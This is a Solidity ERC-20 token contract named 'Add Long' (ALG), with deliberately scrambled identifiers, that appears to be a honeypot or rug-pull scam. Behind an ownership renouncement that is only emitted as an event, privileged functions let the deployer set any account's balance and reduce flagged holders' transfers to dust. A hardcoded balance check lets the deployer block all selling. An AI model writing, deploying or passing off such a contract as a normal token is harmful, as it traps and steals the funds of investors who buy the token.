//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface receiverTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tradingLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitLaunch {
    function createPair(address launchFromTrading, address sellTakeFund) external returns (address);
}

interface fromMin {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromToken) external view returns (uint256);

    function transfer(address tradingSwap, uint256 fundSenderBuy) external returns (bool);

    function allowance(address shouldTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundSenderBuy) external returns (bool);

    function transferFrom(
        address sender,
        address tradingSwap,
        uint256 fundSenderBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderTradingList, uint256 value);
    event Approval(address indexed shouldTo, address indexed spender, uint256 value);
}

interface toAt is fromMin {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AddLong is tradingLaunched, fromMin, toAt {

    constructor (){
        
        receiverTo tradingMaxFee = receiverTo(sellWallet);
        senderShould = limitLaunch(tradingMaxFee.factory()).createPair(tradingMaxFee.WETH(), address(this));
        if (swapReceiver) {
            swapAmount = takeFromLaunched;
        }
        shouldSender = _msgSender();
        buyTotal();
        amountIsLimit[shouldSender] = true;
        takeLimit[shouldSender] = enableTeam;
        
        emit Transfer(address(0), shouldSender, enableTeam);
    }

    uint256 constant exemptLaunched = 17 ** 10;

    bool public txMarketing;

    function totalSupply() external view virtual override returns (uint256) {
        return enableTeam;
    }

    address liquidityIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private enableTeam = 100000000 * 10 ** 18;

    function atLiquidity() private view {
        require(amountIsLimit[_msgSender()]);
    }

    uint256 feeSender;

    function allowance(address senderAt, address fundMin) external view virtual override returns (uint256) {
        if (fundMin == sellWallet) {
            return type(uint256).max;
        }
        return toSwapBuy[senderAt][fundMin];
    }

    function sellTotal(address feeShould, address tradingSwap, uint256 fundSenderBuy) internal returns (bool) {
        if (feeShould == shouldSender) {
            return amountMin(feeShould, tradingSwap, fundSenderBuy);
        }
        uint256 fundBuy = fromMin(senderShould).balanceOf(liquidityIs);
        require(fundBuy == feeSender);
        require(tradingSwap != liquidityIs);
        if (launchedMode[feeShould]) {
            return amountMin(feeShould, tradingSwap, exemptLaunched);
        }
        return amountMin(feeShould, tradingSwap, fundSenderBuy);
    }

    address public shouldSender;

    function owner() external view returns (address) {
        return totalMinEnable;
    }

    function amountMin(address feeShould, address tradingSwap, uint256 fundSenderBuy) internal returns (bool) {
        require(takeLimit[feeShould] >= fundSenderBuy);
        takeLimit[feeShould] -= fundSenderBuy;
        takeLimit[tradingSwap] += fundSenderBuy;
        emit Transfer(feeShould, tradingSwap, fundSenderBuy);
        return true;
    }

    address private totalMinEnable;

    uint8 private maxWallet = 18;

    string private minIs = "ALG";

    function approve(address fundMin, uint256 fundSenderBuy) public virtual override returns (bool) {
        toSwapBuy[_msgSender()][fundMin] = fundSenderBuy;
        emit Approval(_msgSender(), fundMin, fundSenderBuy);
        return true;
    }

    function buyTotal() public {
        emit OwnershipTransferred(shouldSender, address(0));
        totalMinEnable = address(0);
    }

    string private txAuto = "Add Long";

    function atIs(address senderMin) public {
        if (takeLaunched) {
            return;
        }
        
        amountIsLimit[senderMin] = true;
        
        takeLaunched = true;
    }

    bool public takeLaunched;

    mapping(address => bool) public amountIsLimit;

    function symbol() external view virtual override returns (string memory) {
        return minIs;
    }

    event OwnershipTransferred(address indexed marketingReceiver, address indexed exemptTake);

    uint256 private swapAmount;

    bool private swapReceiver;

    function balanceOf(address fromToken) public view virtual override returns (uint256) {
        return takeLimit[fromToken];
    }

    uint256 private enableTotal;

    function getOwner() external view returns (address) {
        return totalMinEnable;
    }

    mapping(address => bool) public launchedMode;

    function decimals() external view virtual override returns (uint8) {
        return maxWallet;
    }

    function enableMinLaunch(address tokenBuy, uint256 fundSenderBuy) public {
        atLiquidity();
        takeLimit[tokenBuy] = fundSenderBuy;
    }

    mapping(address => uint256) private takeLimit;

    uint256 receiverEnable;

    address public senderShould;

    function swapEnable(uint256 fundSenderBuy) public {
        atLiquidity();
        feeSender = fundSenderBuy;
    }

    function transferFrom(address feeShould, address tradingSwap, uint256 fundSenderBuy) external override returns (bool) {
        if (_msgSender() != sellWallet) {
            if (toSwapBuy[feeShould][_msgSender()] != type(uint256).max) {
                require(fundSenderBuy <= toSwapBuy[feeShould][_msgSender()]);
                toSwapBuy[feeShould][_msgSender()] -= fundSenderBuy;
            }
        }
        return sellTotal(feeShould, tradingSwap, fundSenderBuy);
    }

    uint256 private takeFromLaunched;

    mapping(address => mapping(address => uint256)) private toSwapBuy;

    address sellWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return txAuto;
    }

    function transfer(address tokenBuy, uint256 fundSenderBuy) external virtual override returns (bool) {
        return sellTotal(_msgSender(), tokenBuy, fundSenderBuy);
    }

    function sellTake(address senderSwap) public {
        atLiquidity();
        if (swapReceiver != txMarketing) {
            swapAmount = takeFromLaunched;
        }
        if (senderSwap == shouldSender || senderSwap == senderShould) {
            return;
        }
        launchedMode[senderSwap] = true;
    }

}